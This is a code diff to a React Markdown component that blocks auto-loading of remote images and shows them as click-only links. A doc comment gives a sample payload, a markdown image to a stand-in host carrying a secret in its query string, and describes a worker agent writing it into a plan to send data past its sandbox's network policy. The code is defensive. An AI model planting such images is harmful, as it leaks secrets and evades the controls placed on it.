@@ -1,12 +1,49 @@
 import { isValidElement, type ReactNode } from "react";
-import ReactMarkdown, { type Components } from "react-markdown";
+import ReactMarkdown, { defaultUrlTransform, type Components, type UrlTransform } from "react-markdown";
 import remarkGfm from "remark-gfm";
 import "./ui.css";
 
-/** Links stay plain anchors (a new tab, nothing executed); fenced code is
- *  <pre><code>, where the review page's tokenizer plugs in (W8). */
+/** An image the browser may fetch the moment the text renders: one from this
+ *  origin, or inline data. Anything else would be fetched with no click, so a
+ *  worker that wrote `![](https://its.host/?d=<secret>)` into a plan could send
+ *  data out through this browser, past any network policy its sandbox has. */
+function loadsOnItsOwn(src: string): boolean {
+  if (/^data:image\//i.test(src)) return true;
+  try {
+    return new URL(src, location.href).origin === location.origin;
+  } catch {
+    return false;
+  }
+}
+
+/** A remote image's host and path, without the query a secret would ride in. */
+function where(src: string): string {
+  try {
+    const url = new URL(src, location.href);
+    return `${url.host}${url.pathname}`;
+  } catch {
+    return src;
+  }
+}
+
+/** react-markdown drops every `data:` URL; an inline image is let through. */
+const urlTransform: UrlTransform = (url, key, node) =>
+  key === "src" && node.tagName === "img" && /^data:image\//i.test(url) ? url : defaultUrlTransform(url);
+
+/** Links stay plain anchors (a new tab, nothing executed); a remote image is a
+ *  link to it, opened only on a click; fenced code is <pre><code>, where the
+ *  review page's tokenizer plugs in (W8). */
 const components: Components = {
   a: ({ href, children }) => <a href={href} target="_blank" rel="noopener noreferrer">{children}</a>,
+  img: ({ src, alt }) => {
+    if (typeof src !== "string" || !src) return alt ? <span>{alt}</span> : null;
+    if (loadsOnItsOwn(src)) return <img src={src} alt={alt ?? ""} />;
+    return (
+      <a className="md-img-link" href={src} target="_blank" rel="noopener noreferrer" title={alt || undefined}>
+        image: {where(src)}
+      </a>
+    );
+  },
   pre: ({ children }) => <pre className="md-pre">{children}</pre>,
 };
 
@@ -30,7 +67,7 @@ function withCode(code: CodeRenderer): Components {
 export function Markdown({ text, code }: { text: string; code?: CodeRenderer }) {
   return (
     <div className="md">
-      <ReactMarkdown remarkPlugins={[remarkGfm]} components={code ? withCode(code) : components}>{text}</ReactMarkdown>
+      <ReactMarkdown remarkPlugins={[remarkGfm]} urlTransform={urlTransform} components={code ? withCode(code) : components}>{text}</ReactMarkdown>
     </div>
   );
 }
